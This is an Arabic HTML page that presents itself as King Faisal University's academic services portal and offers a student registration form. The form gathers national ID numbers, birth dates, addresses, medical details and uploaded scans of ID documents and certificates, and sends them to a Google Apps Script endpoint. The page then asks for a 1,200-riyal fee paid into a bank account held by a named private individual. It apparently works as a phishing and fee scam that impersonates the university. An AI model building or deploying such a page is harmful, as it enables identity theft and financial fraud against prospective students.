<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>بوابة الخدمات الأكاديمية - جامعة الملك فيصل</title>
<link rel="icon" type="image/png" href="kfu_logo.png">
<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
<style>
:root{
  --uf-green:#0b6b44;
  --gold:#d4af37;
  --bg:#f5f6f8;
  --card:#ffffff;
  --muted:#6b6b6b;
}
*{box-sizing:border-box}
body{
  margin:0;
  font-family:"Cairo","Segoe UI",Tahoma,sans-serif;
  background:var(--uf-green);
  color:#fff;
}
.login-container{
  min-height:100vh;
  display:flex;
  flex-direction:column;
  align-items:center;
  justify-content:center;
  text-align:center;
  padding:20px;
}
.logo-circle{
  width:120px;
  height:120px;
  border-radius:50%;
  background:#fff;
  display:flex;
  align-items:center;
  justify-content:center;
  margin:0 auto 20px;
}
.logo-circle img{
  width:80%;
  height:auto;
}
h1{
  margin:10px 0 5px;
  font-size:28px;
  font-weight:800;
}
p.subtitle{
  margin:0 0 20px;
  font-size:16px;
}
.quick-access a{
  display:inline-flex;
  align-items:center;
  gap:10px;
  background:#fff;
  color:var(--uf-green);
  padding:12px 20px;
  border-radius:8px;
  font-weight:600;
  text-decoration:none;
  transition:0.3s;
  margin-top:15px;
}
.quick-access a:hover{
  background:var(--gold);
  color:#fff;
}
.container{
  max-width:1150px;
  margin:20px auto;
  background:var(--card);
  border-radius:14px;
  box-shadow:0 10px 30px rgba(0,0,0,0.08);
  padding:36px 48px;
  border-top:6px solid var(--uf-green);
  display:none;
  position:relative;
  z-index:100;
  color:#222;
}
header.brand{
  display:flex;
  align-items:center;
  gap:14px;
  margin-bottom:15px;
}
header .logo{
  width:72px;
  height:72px;
  border-radius:10px;
  background:linear-gradient(135deg,var(--uf-green),#064b33);
  display:flex;
  align-items:center;
  justify-content:center;
  color:#fff;
  font-weight:800;
  font-size:18px;
  box-shadow:0 4px 14px rgba(11,107,68,0.15) inset;
}
h1.form-title{
  margin:0;
  font-size:22px;
  color:var(--uf-green);
}
.subtitle{color:#666; font-size:14px; margin:4px 0 0}
.grid2{display:grid;grid-template-columns:1fr 1fr;gap:28px 36px;margin-top:20px}
label{display:block;font-weight:600;color:var(--uf-green);margin-bottom:6px;font-size:14px}
input,select,textarea{
  width:100%;
  padding:12px;
  border-radius:10px;
  border:1px solid #dcdcdc;
  background:#fbfbfb;
  font-size:14px;
}
textarea{min-height:90px;resize:vertical}
.section-title{margin-top:20px;margin-bottom:8px;font-weight:700;color:#444;border-bottom:1px dashed #eee;padding-bottom:6px}
.files-row{display:grid;grid-template-columns:1fr 1fr;gap:12px}
.account-section{display:flex;align-items:center;justify-content:space-between;gap:12px;background:#fbfbfb;padding:14px;border-radius:10px;border:1px solid #efecec;margin-top:20px}
.copy-btn{background:var(--gold);color:#fff;border:none;padding:10px 16px;border-radius:8px;cursor:pointer;font-weight:700}
.submit-area{text-align:center;margin-top:26px;display:flex;justify-content:center;gap:12px}
.btn{background:var(--uf-green);color:#fff;border:none;padding:12px 36px;border-radius:10px;font-weight:700;cursor:pointer;font-size:16px}
.btn.cancel{background:#9e9e9e}
.toast{position:fixed;top:20px;right:20px;background:var(--uf-green);color:#fff;padding:12px 18px;border-radius:8px;box-shadow:0 6px 18px rgba(0,0,0,0.15);opacity:0;transform:translateY(-10px);transition:all .4s ease;z-index:999}
.toast.show{opacity:1;transform:translateY(0)}
@media (max-width:900px){.grid2{grid-template-columns:1fr}.files-row{grid-template-columns:1fr}.header.brand{flex-direction:column;align-items:flex-start;gap:10px}}
</style>
</head>
<body>

<div class="login-container">
  <div class="logo-circle"><img src="kfu_logo.png" alt="شعار جامعة الملك فيصل"></div>
  <h1>جامعة الملك فيصل</h1>
  <p class="subtitle">بوابة الخدمات الأكاديمية</p>
  <div class="quick-access">
    <a href="#" onclick="showForm()"><i class="fas fa-user-graduate"></i>تقديم طلب جديد</a>
  </div>
</div>

<!-- نموذج التسجيل -->
<div class="container" id="registrationForm">
<form id="registrationFormForm" action="https://script.google.com/macros/s/AKfycbxglQ_oGCF_ICL56X9dofD56F1mF89vIef6NrN7BObysCTEs5xQVfQ9wGc8N4aWwkG2/exec" method="POST" enctype="multipart/form-data">
<header class="brand">
  <div class="logo">KFU</div>
  <div>
    <h1 class="form-title">نموذج التسجيل - جامعة الملك فيصل</h1>
    <p class="subtitle">يرجى تعبئة جميع الحقول بدقة وإرفاق الملفات المطلوبة.</p>
  </div>
</header>

<div class="grid2">
<div>
<label>الاسم الكامل *</label><input type="text" name="fullName" required>
<label>الجنس *</label>
<select name="gender" required><option value="">اختر...</option><option>ذكر</option><option>أنثى</option></select>
<label>الجنسية *</label>
<select name="nationality" required>
<option value="">اختر</option>
<option>السعودية</option>
<option>اليمن</option>
<option>مصر</option>
<option>سوريا</option>
<option>الأردن</option>
<option>العراق</option>
<option>لبنان</option>
<option>فلسطين</option>
<option>السودان</option>
<option>تونس</option>
<option>المغرب</option>
<option>الإمارات</option>
<option>الكويت</option>
<option>البحرين</option>
<option>عمان</option>
<option>قطر</option>
<option>تركيا</option>
<option>أفغانستان</option>
<option>باكستان</option>
<option>الهند</option>
<option>إندونيسيا</option>
<option>Other</option>
</select>
<label>الدولة (مكان الإقامة) *</label>
<select name="country" required>
<option value="">اختر الدولة</option>
<option>المملكة العربية السعودية</option>
<option>اليمن</option>
<option>مصر</option>
<option>الإمارات</option>
<option>الكويت</option>
<option>البحرين</option>
<option>عمان</option>
<option>قطر</option>
<option>الأردن</option>
<option>سوريا</option>
<option>لبنان</option>
<option>السودان</option>
<option>المغرب</option>
<option>تونس</option>
<option>أخرى</option>
</select>
<label>رقم الهوية / الإقامة *</label><input type="text" name="idNumber" required>
<label>تاريخ الميلاد *</label><input type="date" name="birthDate" required>
<label>المدينة *</label><input type="text" name="city" required>
<label>العنوان بالتفصيل *</label><textarea name="address" placeholder="شارع - حي - رمز بريدي" required></textarea>
<label>رقم الجوال *</label><input type="tel" name="phone" required>
<label>البريد الإلكتروني *</label><input type="email" name="email" required>
</div>

<div>
<label>نوع المؤهل السابق *</label>
<select name="prevDegree" required>
<option value="">اختر...</option>
<option>ثانوي</option>
<option>دبلوم</option>
<option>بكالوريوس</option>
<option>ماجستير</option>
</select>
<label>سنة التخرج *</label><input type="number" name="gradYear" min="1900" max="2100" required>
<label>اسم المدرسة / الجامعة السابقة</label><input type="text" name="prevInstitute">
<label>المعدل / النسبة</label><input type="text" name="gpa">
<label>التخصص المطلوب *</label><input type="text" name="desiredMajor" required>
<label>نوع الدراسة *</label>
<select name="studyType" required><option value="">اختر...</option><option>انتظام</option><option>انتساب</option><option>تعليم عن بعد</option></select>
<label>الكلية / القسم *</label>
<select name="faculty" required>
<option value="">اختر الكلية</option>
<option>كلية الطب</option>
<option>كلية الهندسة</option>
<option>كلية العلوم</option>
<option>كلية الآداب</option>
<option>كلية إدارة الأعمال</option>
<option>كلية الحاسبات وتقنية المعلومات</option>
<option>كلية التربية</option>
<option>كلية القانون</option>
<option>كلية الصحة العامة</option>
</select>
<label>هل لديك أي حالة طبية هامة؟</label>
<input type="text" name="medicalInfo" placeholder="إن وُجد">
<div class="section-title">جهة الاتصال في حالات الطوارئ</div>
<label>اسم جهة الاتصال للطوارئ</label><input type="text" name="emergencyName" placeholder="اسم قريب">
<label>صلة القرابة</label><input type="text" name="emergencyRelation" placeholder="أم/أب/أخ/صديق">
<label>رقم الطوارئ</label><input type="tel" name="emergencyPhone" placeholder="رقم جوال للطوارئ">
</div>
</div>

<div class="section-title">المرفقات المطلوبة</div>
<div class="files-row">
<div><label>صورة الهوية / الإقامة *</label><input type="file" name="fileId" accept="image/*,application/pdf" required></div>
<div><label>صورة الشهادة / المؤهل *</label><input type="file" name="fileCertificate" accept="image/*,application/pdf" required></div>
</div>
<div class="files-row">
<div><label>صورة شخصية *</label><input type="file" name="filePhoto" accept="image/*" required></div>
<div><label>إيصال الدفع</label><input type="file" name="fileReceipt" accept="image/*,application/pdf"></div>
</div>

<div class="account-section">
<div>
<div class="bank-name">رقم الحساب:</div>
<div style="font-weight:800;color:var(--uf-green)">SA1980000857608010276380</div>
<div>الرسوم: 1200 ريال</div>
</div>
<div><button type="button" class="copy-btn" id="copyAccountBtn">نسخ رقم الحساب</button></div>
</div>

<div style="margin-top:16px">
<label><input type="checkbox" name="agree" required> أقرّ بأن جميع البيانات المدخلة صحيحة.</label>
</div>

<div class="submit-area">
<button type="submit" class="btn">إرسال الطلب</button>
<button type="reset" class="btn cancel">إلغاء</button>
</div>

</form>
</div>

<div class="toast" id="toast"></div>

<script>
function showForm(){
  document.getElementById('registrationForm').style.display='block';
  document.querySelector('.login-container').style.display='none';
}

document.getElementById('copyAccountBtn').addEventListener('click', ()=>{
  const text='SA1980000857608010276380';
  navigator.clipboard.writeText(text);
  showToast('✅ تم نسخ رقم الحساب');
});

function showToast(msg){
  const toast=document.getElementById('toast');
  toast.textContent=msg;
  toast.classList.add('show');
  setTimeout(()=>toast.classList.remove('show'),2500);
}

// إرسال النموذج
document.getElementById('registrationFormForm').addEventListener('submit', function(e){
  e.preventDefault();
  const fd=new FormData(this);
  fetch(this.action,{method:'POST',body:fd})
  .then(res=>{
    if(res.ok){
      showToast('✅ تم إرسال الطلب بنجاح!');
      this.reset();
      showPaymentForm();
    } else showToast('❌ حدث خطأ، حاول لاحقاً.');
  }).catch(()=>showToast('❌ فشل الاتصال، تحقق من الإنترنت.'));
});

// بعد الإرسال، عرض صفحة الرسوم (نافذة منفصلة)
function showPaymentForm(){
  const container=document.getElementById('registrationForm');
  container.innerHTML=`
  <h2 style="color:var(--uf-green);text-align:center">تم استلام جميع بياناتك!</h2>
  <p style="text-align:center;color:#555">سيتم التواصل معك عبر الواتساب أو البريد الإلكتروني لإرسال الرقم الجامعي.</p>
  <div class="account-section" style="justify-content:center;margin-top:20px">
  <div>
  <div class="bank-name">رقم الحساب:</div>
  <div style="font-weight:800;color:var(--uf-green)">SA1980000857608010276380</div>
  <div>اسم صاحب الحساب: عبدالله محمد</div>
  <div>المبلغ: 1200 ريال</div>
  <div style="margin-top:10px"><label>رفع إيصال الدفع:</label><input type="file" style="padding:8px;border-radius:6px"></div>
  </div>
  </div>`;
}
</script>

</body>
</html>
